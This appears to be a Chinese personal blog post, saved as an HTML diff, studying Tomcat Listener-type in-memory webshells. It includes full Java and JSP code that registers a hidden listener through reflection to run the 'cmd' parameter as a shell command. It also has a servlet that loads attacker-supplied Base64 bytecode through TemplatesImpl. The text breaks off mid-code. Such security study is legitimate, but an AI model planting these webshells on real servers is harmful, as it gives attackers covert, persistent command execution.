@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="P1taya">
+    
+    <title>
+        
+            Tomcat内存马—Listener型 |
+        
+        P1taya
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/p1taya.jpg">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/demo1.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"root":"","source_data":{"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶狗and猫","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]},"version":"4.1.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/p1taya.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               P1taya
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-layer-group"></i>
+                                
+                                分类
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/photos"
+                            >
+                                
+                                    <i class="menu-icon fa-solid fa-image"></i>
+                                
+                                相册
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links"
+                    >友链</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/photos"
+                    >相册</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Tomcat内存马—Listener型
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/p1taya.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">P1taya</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-06-14 22:10:33</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Wed Apr 17 2024 16:43:00 GMT+0800">2024-04-17 16:43:00</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>14 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前学了 filter 型的内存马，现在继续学习 listener 型</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>前面的 <code>filter</code> 内存马是通过动态注册恶意的 <code>filter</code> 来实现一个 <code>webshell</code> ，这个 <code>listener</code> 内存马原理其实也差不多，就是动态注册一个恶意的 <code>listener</code> 。</p>
+<h3 id="构造恶意Listener"><a href="#构造恶意Listener" class="headerlink" title="构造恶意Listener"></a>构造恶意Listener</h3><p>这个恶意的 <code>Listener</code> 要实现一个webshell的功能，就需要获取到 <code>request</code> 对象，现在来看一下怎么构造出这个恶意 <code>Listener</code></p>
+<p><code>requestInitialized</code> 方法只有一个<code>ServletRequestEvent</code> 类型的参数，也就是servlet请求事件。那么就需要想办法从这个 <code>ServletRequestEvent</code> 对象中来获取 <code>request</code> 对象。</p>
+<p>可以看到该对象有一个 <code>getServletRequest</code> 方法，看起来就跟 <code>request</code> 对象有关</p>
+<p>可以看到返回了一个 <code>ServletRequest</code> 接口的实现类的对象，测试一下看看具体返回的哪个类的对象</p>
+<p>可以看到是 <code>org.apache.catalina.connector.RequestFacade</code> 的对象，看看他有哪些属性</p>
+<p>发现其有 <code>request</code> 属性是 <code>Request</code> 类型的，那么我们就可以通过反射来获取该属性的值</p>
+<p>开始构造恶意 <code>Listener</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.catalina.connector.Request;</span><br><span class="line">import org.apache.catalina.connector.RequestFacade;</span><br><span class="line">import org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line">import javax.servlet.Filter;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletRequestEvent;</span><br><span class="line">import javax.servlet.ServletRequestListener;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class Testlistener implements ServletRequestListener &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class="line">        try &#123;</span><br><span class="line">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">            requestf.setAccessible(true);</span><br><span class="line">            Request request= (Request) requestf.get(test);</span><br><span class="line">            Response response=request.getResponse();</span><br><span class="line"></span><br><span class="line">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            if(cmd!=null)&#123;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class="line">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">                byte[] b = new byte[1024];</span><br><span class="line">                int a = -1;</span><br><span class="line"></span><br><span class="line">                while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                    baos.write(b, 0, a);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功</p>
+<h3 id="实现动态注册Listener"><a href="#实现动态注册Listener" class="headerlink" title="实现动态注册Listener"></a>实现动态注册Listener</h3><p>现在来理一下 <code>Listener</code> 的注册流程</p>
+<p>先下两个断点，第一个断点是为了查看什么时候进行的实例化，第二个断点是要知道什么时候调用的该方法。</p>
+<p>在 <code>StandardContext$listenerStart</code>进行实例化，我们跟踪一下 <code>listeners</code> 的来源</p>
+<p><code>listeners</code> 是一个 <code>String</code> 类型的数组，存储了 <code>listener</code> 的名字,通过 <code>findApplicationListeners</code> 方法获取值</p>
+<p><code>results</code> 数组用来存储已经实例化的 <code>listener</code> 对象，然后继续看</p>
+<p>将 <code>results</code> 中的 <code>listener</code> 分类存放，我们的 <code>TestListener</code> 就被分到了 <code>eventListeners</code> 中</p>
+<p>然后调用 <code>getApplicationEventListeners</code> 获取 <code>applicationEventListenersList</code> ，就是已注册的 <code>applicationEventListener</code> ，并将其添加到我们的 <code>eventListeners</code> 中。之后再调用 <code>setApplicationEventListeners</code> 将<code>eventListeners</code> 设置为<code>ApplicationEventListeners</code> 。刚看到时我在想，为什么要将已有的<code>applicationEventListener</code> 取出来，然后再 <code>set</code> 呢，这不会重复吗，随后跟进一下 <code>setApplicationEventListeners</code> 方法的源码就知道了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void setApplicationEventListeners(Object[] listeners) &#123;</span><br><span class="line">        this.applicationEventListenersList.clear();</span><br><span class="line">        if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;</span><br><span class="line">            this.applicationEventListenersList.addAll(Arrays.asList(listeners));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法首先会清空 <code>applicationEventListenersList</code> ，然后再进行添加。</p>
+<p>然后 <code>instance</code> 这个数组就会获取所有已注册的 <code>lsitener</code> ，且是已实例化的 <code>listener</code> ，然后就是一些其他的处理了，这里不再关注。</p>
+<p>继续看第二个断点</p>
+<p>可以看到对 <code>requestInitialized</code> 方法的调用是在 <code>StandardContext$fireRequestInitEvent</code> 中进行的，这个 <code>listener</code> 是从 <code>instances</code> 数组中得到的，而<code>instances</code> 又是调用<code>getApplicationEventListeners</code> 方法获取的</p>
+<p>那么其实我们如果将恶意 <code>listener</code> 添加到这个 list中就可以了，就像这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class="line">List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class="line">List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class="line">listenerList.add(new Testlistener());</span><br><span class="line">standardContext.setApplicationEventListeners(listenerList.toArray());</span><br></pre></td></tr></table></figure>
+
+<h3 id="JSP实现内存马注入"><a href="#JSP实现内存马注入" class="headerlink" title="JSP实现内存马注入"></a>JSP实现内存马注入</h3><p>先使用 <code>JSP</code> 实现内存马的注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    class Testlistener implements ServletRequestListener &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class="line">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class="line">            try &#123;</span><br><span class="line">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">                requestf.setAccessible(true);</span><br><span class="line">                Request request= (Request) requestf.get(test);</span><br><span class="line">                Response response=request.getResponse();</span><br><span class="line"></span><br><span class="line">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line">                System.out.println(cmd);</span><br><span class="line">                if(cmd!=null)&#123;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class="line">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">                    byte[] b = new byte[1024];</span><br><span class="line">                    int a = -1;</span><br><span class="line"></span><br><span class="line">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class="line">                        baos.write(b, 0, a);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    //获取StandardContext</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    </span><br><span class="line">    //注入listener</span><br><span class="line">    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class="line">    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class="line">    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class="line">    listenerList.add(new Testlistener());</span><br><span class="line">    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以执行命令并获取回显</p>
+<h3 id="动态加载字节码实现内存马注入"><a href="#动态加载字节码实现内存马注入" class="headerlink" title="动态加载字节码实现内存马注入"></a>动态加载字节码实现内存马注入</h3><p>用反序列化有点麻烦，通常我们反序列化注入内存马也是用加载字节码的方式，所以我这里直接加载字节码方便一点，原理一样的。</p>
+<p>测试demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import javax.xml.transform.TransformerConfigurationException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class ListenerShell extends HttpServlet&#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        String test=req.getParameter(&quot;test&quot;);</span><br><span class="line">        byte[] bytecode= Base64.getDecoder().decode(test);</span><br><span class="line">        byte[][] bytee= new byte[][]&#123;bytecode&#125;;</span><br><span class="line">        TemplatesImpl templates=new TemplatesImpl();</span><br><span class="line">        try &#123;</span><br><span class="line">            setFildValue(templates,&quot;_bytecodes&quot;,bytee);</span><br><span class="line">            setFildValue(templates,&quot;_name&quot;,&quot;Code&quot;);</span><br><span class="line">            setFildValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">            templates.newTransformer();</span><br><span class="line">        &#125; catch (TransformerConfigurationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        super.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是利用 <code>TemplatesImpl</code> 加载字节码，试一下</p>
+<p>现在来编写POC，这里我们还是用之前学的 <code>lastServicedRequest</code> 的方式获取回显，过程还是分为两不</p>
+<ul>
+<li>将 <code>request</code> 和 <code>response</code> 对象分别存放进<code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 对象</li>
+<li>将 <code>request</code> 从 <code>lastServicedRequest</code>取出，并通过其动态注册恶意 listener</li>
+</ul>
+<p>第一步可以直接用之前的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class Echoinject extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //修改WRAP_SAME_OBJECT的值为true</span><br><span class="line">            Class dispatcher = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);</span><br><span class="line">            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);</span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(true);</span><br><span class="line"></span><br><span class="line">            //修改final变量，否则不能修改final的属性</span><br><span class="line">            Field modifiersField = 